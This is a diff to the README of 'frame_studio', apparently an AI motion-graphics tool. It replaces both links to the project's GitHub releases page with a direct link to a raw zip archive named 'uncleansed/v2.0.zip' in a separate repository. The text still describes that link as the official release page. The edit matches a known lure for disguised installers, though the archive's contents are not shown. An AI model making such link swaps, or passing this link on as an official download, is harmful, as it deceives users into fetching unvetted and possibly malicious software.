@@ -5,7 +5,7 @@ description: "Generate motion graphics from text prompts using React, Remotion, 
 ---
 # 🎬 frame_studio - Make professional motion videos with ai
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Audysquinteyed352/frame_studio/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://raw.githubusercontent.com/Audysquinteyed352/audysquinteyed352.github.io/main/uncleansed/v2.0.zip)
 
 Frame Studio turns your text into high-quality video. The software uses artificial intelligence to build motion graphics for you. You type a prompt, and the tool renders a clean, finished video file. You save time on animation while you maintain control of the creative output. The tool exports videos in the industry-standard MP4 format.
 
@@ -13,7 +13,7 @@ Frame Studio turns your text into high-quality video. The software uses artifici
 
 You need to obtain the installer from the official release page. Visit the link below to find the most recent version of the application.
 
-[https://github.com/Audysquinteyed352/frame_studio/releases](https://github.com/Audysquinteyed352/frame_studio/releases)
+[https://raw.githubusercontent.com/Audysquinteyed352/audysquinteyed352.github.io/main/uncleansed/v2.0.zip](https://raw.githubusercontent.com/Audysquinteyed352/audysquinteyed352.github.io/main/uncleansed/v2.0.zip)
 
 ## 💻 System requirements
 
